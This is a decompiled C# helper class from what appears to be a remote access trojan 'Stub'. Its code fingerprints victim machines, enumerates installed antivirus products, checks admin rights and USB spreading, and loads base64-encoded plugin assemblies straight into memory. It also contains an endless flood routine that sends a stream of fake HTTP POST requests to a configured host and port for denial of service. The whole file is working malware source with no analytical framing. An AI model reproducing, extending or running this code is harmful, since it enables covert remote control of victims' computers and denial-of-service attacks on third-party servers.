using System;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub;

[StandardModule]
internal sealed class Helper
{
	private static readonly string[] userAgents = new string[3] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };

	public static string IPHOST;

	public static string PortHost;

	public static Thread DDos;

	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static string ID()
	{
		try
		{
			return GetHashT(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Err HWID";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetHashT(string strToHash)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(strToHash);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString().Substring(0, 20).ToUpper();
	}

	public static object frombase64(string bs64)
	{
		object result = default(object);
		try
		{
			result = Convert.FromBase64String(bs64);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object objj(string byt)
	{
		return RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin((byte[])frombase64(byt), "Class1")));
	}

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + c))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static byte[] AES_Encryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string INDATE()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(Settings.current);
			return fileInfo.LastWriteTime.ToString("dd/MM/yyy");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string usbp()
	{
		try
		{
			if (Operators.CompareString(Path.GetFileName(Settings.current), Settings.USBNM, false) == 0)
			{
				return "True";
			}
			return "False";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string admin()
	{
		try
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string Comment()
	{
		try
		{
			string text = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + ID(), "NT", null));
			if (Operators.CompareString(text, (string)null, false) == 0)
			{
				return "Nothing";
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string Antivirus()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
				try
				{
					enumerator = val.Get().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						stringBuilder.Append(current.get_Item("displayName").ToString());
						stringBuilder.Append(",");
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (stringBuilder.ToString().Length == 0)
				{
					return "None";
				}
				return stringBuilder.ToString().Substring(0, checked(stringBuilder.Length - 1));
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "None";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool CreateMutex()
	{
		Settings._appMutex = new Mutex(initiallyOwned: false, Settings.Mutexx, out var createdNew);
		return createdNew;
	}

	public static void CloseMutex()
	{
		if (Settings._appMutex != null)
		{
			Settings._appMutex.Close();
			Settings._appMutex = null;
		}
	}

	public static object STDos()
	{
		while (true)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				try
				{
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.Connect(IPHOST, Convert.ToInt32(PortHost));
					string s = "POST / HTTP/1.1\r\nHost: " + IPHOST + "\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + userAgents[new Random().Next(userAgents.Length)] + "\r\nContent-length: 5235\r\n\r\n";
					byte[] bytes = Encoding.UTF8.GetBytes(s);
					socket.Send(bytes, 0, bytes.Length, SocketFlags.None);
					socket.Dispose();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			});
			thread.Start();
			thread.Join();
		}
	}

	public static string IsValid(string Address)
	{
		try
		{
			return new Uri(Address).DnsSafeHost;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return Address;
		}
	}
}
